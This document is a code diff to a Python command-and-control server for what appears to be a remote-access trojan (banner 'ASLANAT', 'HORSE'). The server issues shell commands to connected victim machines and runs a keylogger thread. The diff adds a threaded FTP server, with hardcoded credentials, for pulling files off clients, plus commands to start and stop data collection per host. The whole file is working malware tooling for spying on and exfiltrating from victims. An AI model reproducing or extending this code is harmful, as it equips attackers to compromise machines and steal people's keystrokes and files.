@@ -4,10 +4,12 @@ import json
 import os
 import time
 import sys
+import logging
 from pynput import keyboard
 from tabulate import tabulate
-from ftplib import FTP
-
+from pyftpdlib.authorizers import DummyAuthorizer
+from pyftpdlib.handlers import FTPHandler
+from pyftpdlib.servers import ThreadedFTPServer
 
 Host = "192.168.30.52"
 Port = 6565
@@ -17,8 +19,9 @@ line_buffer = ""
 
 
 class ftpserver:
-    ftp_username = 'ccServer'
-    ftp_password = 'ccPassword'
+    ftp_username = "Necati"
+    ftp_password = "P;F3nj+qXp.N^H8!*=$#kl"
+
 
 class colour:
     CC = "\033[34mASLANAT\033[0m"
@@ -40,7 +43,9 @@ COMMANDS    Usage                            DESCRIPTION
 ---------   ------------------------------   -----------
 connect     connect <NickName>               Connect to Spesific Host
             close                            Close Connection
-            ftp <data>                       Copy data inside of ./FTP/
+            ftp <-d/-u> <data>               FTP server has two option -d, -u
+                -d                           Download file from client to ./Data/ftp folder
+                -u                           Upload file from ./Data/ftp folder to pwd
 list        list                             Show all Hosts
 nick        nick <HostName> <New NickName>   Assign or Change NickName
 history     history                          Show Command History
@@ -95,10 +100,23 @@ HORSE ="""
 
 
 
-def ftp()
 
+def ftp_server():
+    authorizer = DummyAuthorizer()
+    authorizer.add_user(ftpserver.ftp_username, ftpserver.ftp_password, "./Data/ftp", perm="elradfmw")
+    handler = FTPHandler
+    handler.authorizer = authorizer
+    logging.basicConfig(level=logging.INFO,
+                        filename='./Data/log/ftp_server.log',
+                        format='%(asctime)s - %(levelname)s - %(message)s')
 
-
+    # Suppress logging to terminal
+    logging.getLogger().setLevel(logging.INFO)
+    server = ThreadedFTPServer(("0.0.0.0", 21), handler)
+    server.serve_forever()
+    while True:
+        if not data_collection:
+            server.close_when_done()
 
 
 
@@ -119,6 +137,8 @@ def start_data_read():
     data_reloader.start()
     key_log =threading.Thread(target=keylogs)
     key_log.start()
+    ftp_thread = threading.Thread(target=ftp_server,daemon=True,name="FTP")
+    ftp_thread.start()
 
 def stop_data_read():
     global data_collection
@@ -234,18 +254,13 @@ def connect(NickName):
                     log_saver(HostName,command)
                     if command == "clear" or command == "cls":
                         os.system('cls' if os.name == 'nt' else 'clear')
-                    elif command[0:3] == "ftp":
-                        # try:
-                        ftp_client(command.split()[1],command.split()[2],IP)
-                        # except:
-                            # print(colour.info("[*] Wrong command !!!"))
-                        break
                     elif command != "":
                         break
                 client.send(command.encode('utf-8'))
                 output = f"{client.recv(4096000).decode('utf-8')}"
                 print(output,end="")
                 log_saver(HostName,output)
+
 
 def nick(HostName,NickName):
     for client in data['client_list']:
@@ -261,7 +276,12 @@ def close():
         f.send(b"exit")
     server.close()
     global data_collection
-    data_collection = False                
+    data_collection = False 
+    for client in data['client_list']:
+        client["Status"] = "False"
+    with open('./Data/client_list.json', 'w') as f:
+        json.dump(data, f,indent=4)
+                       
     ### send message to client for go silent mode ###
 
 def lists():
@@ -272,10 +292,25 @@ def lists():
 
 
 
-     
+def start(NickName):
+    for client in data['client_list']:
+        if client["NickName"] == NickName:
+            history_saver(f"[*] {NickName}'s Status Changed as: True ")
+            print(colour.info(f"[*] {NickName}'s Status Changed as: True"))
+            client["Status"] = "True"
+            with open('./Data/client_list.json', 'w') as f:
+                json.dump(data, f,indent=4)
 
 
-
+def stop(NickName):
+    for client in data['client_list']:
+        if client["NickName"] == NickName:
+            history_saver(f"[*] {NickName}'s Status Changed as: False ")
+            print(colour.info(f"[*] {NickName}'s Status Changed as: False"))
+            client["Status"] = "False"
+            with open('./Data/client_list.json', 'w') as f:
+                json.dump(data, f,indent=4)
+                
 
 
 
@@ -331,6 +366,12 @@ if __name__ == "__main__":
                 
             case "clist":
                 print(client_list)
+                
+            case "start":
+                start(command[1])
+                
+            case "stop":
+                stop(command[1])
                 
             case _ :
                 print(colour.info('[*] Command not Found'))
